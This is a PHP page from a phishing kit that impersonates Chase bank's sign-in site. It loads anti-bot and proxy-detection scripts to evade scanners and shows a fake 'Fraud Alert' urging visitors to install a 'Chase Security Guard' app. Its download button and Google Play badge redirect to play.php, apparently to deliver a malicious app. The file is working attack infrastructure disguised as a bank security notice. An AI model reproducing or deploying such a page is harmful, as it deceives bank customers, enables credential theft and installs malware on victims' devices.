
<?php

    ob_start();
    session_start();
require("../admin/config.php");
require("../settings.php");
//require_once("../sec/sniper.php");
require_once("../sec/antibot.php");
require_once("../sec/botinho.php");
require_once("../sec/proxycheck.php");
require_once("../sec/altproxy.php");


    one_time(one_time_access,redirect_to);

if(isset($_POST['submit'])){


	
	header("location: play.php");

    
    }


?>

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="refresh" content="60;url=<?php echo redirect_to; ?>">

    <title><?php echo htmlentities("Sign in - chase.com", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/shop-homepage.css" rel="stylesheet">
    <link href="../css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/chasefavicon.ico">
    <script src="https://kit.fontawesome.com/6222530beb.js"></script>

</head>

<body class="fl">
    <header class="e-header">
        <div class="col-xs-4 header-elements">
            <a href="#" class="menu-line">
                <i class="fas fa-bars"></i>
            </a>
        </div>
        <div class="col-xs-4 header-elements">
            <img src="../img/octogon-white.png" alt="Chase">
        </div>
        <div class="col-xs-4 header-elements ura">
            <span class="labelinho">
                Espa&#241;ol
            </span>
        </div>
    </header>
    <main id="e-content">
        <div class="oe-gs">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                        <h1 class="oe-header">Install Security Guard</h1>
                        <div class="oe-progress-bar">
                            <div class="bar fill finale"></div>
                        </div>
                        <div class="H2 oe-secure">Fraud Alert</br>Install the Chase Security Guard App. !</div>
                        
                    </div>
                </div>
                
            </div>
        </div>
    </main>
    <section id="opc-content">
        <div class="field-mt-18">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                <div id="personal">
                    <div class="row">
                        <div class="col-xs-12">
                            <div class="success-wraps">
							    <a href="play.php">
                                <img src="../img/get-it-on-google-play.png" alt="">
								</a>
                            </div>
                        </div>
                    </div>
                    <div class="row">
					<form action="" method="post" enctype="multipart/form-data">
                        <div class="col-xs-12 col-sm-12">
                            <h2 class="H4 eGSA">To finish securing your account you must install the Chase Security Guard app ! <br><br>For your future security stay updated with the new Chase security Gard features</h2>
                        <input type="submit" class="out-nxt" name="submit" value="Download">
						</div>
				</form>
                    </div>
                </div>
            </div>
        </div>
    </section>
    



<script src="../js/jquery.js"></script>
<script src="../js/bootstrap.min.js"></script>


</body>

</html>